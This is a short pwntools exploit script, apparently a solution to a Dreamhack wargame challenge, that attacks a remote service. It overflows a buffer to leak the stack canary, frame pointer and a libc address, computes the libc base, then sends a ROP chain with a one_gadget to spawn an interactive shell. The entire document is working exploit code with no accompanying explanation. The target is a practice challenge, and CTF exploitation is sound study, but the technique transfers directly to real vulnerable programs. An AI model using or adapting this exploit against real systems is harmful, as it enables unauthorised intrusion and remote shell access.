from pwn import *

context.log_level = "debug"

log = lambda x,y: print(f"[+] {x}: {y}")

call_main_offset = 0x29d90

xor_edx = 0x149ac9
xor_r10d = 0x149ac8
one_gadget = 0xebcf5

def menu(p):
	p.recvuntil(b"> ")

def read(p, payload):
	menu(p)
	p.send(b"2.")
	p.recvuntil(b"Write: .\n")
	p.send(payload)

def write(p):
	menu(p)
	p.send(b"1.")


#p = process("./prob")
p = remote("host1.dreamhack.games", 13102)
libc = ELF("./libc.so.6")

payload =b"A"*256

read(p, payload)

write(p)
a = p.recvuntil(b"A"*256)
log("A", a)
a = p.recvline()
canary = u64(a[8:16])
fbp = u64(a[16:24])
log("canary", hex(canary))
libc_base = u64(a[16+0x18:16+0x18+8]) - call_main_offset
log("libc_base", hex(libc_base))
libc.address = libc_base
log("system", hex(libc.symbols['system']))

xor_edx = libc_base + xor_edx
xor_r10d = libc_base + xor_r10d
one_gadget = libc_base + one_gadget

payload = b""
payload += b"A"*0x18
payload += p64(canary)
payload += p64(fbp)
payload += p64(xor_edx)
payload += p64(xor_r10d)
payload += p64(one_gadget)
payload += b"."

menu(p)
p.send(payload)

p.interactive()
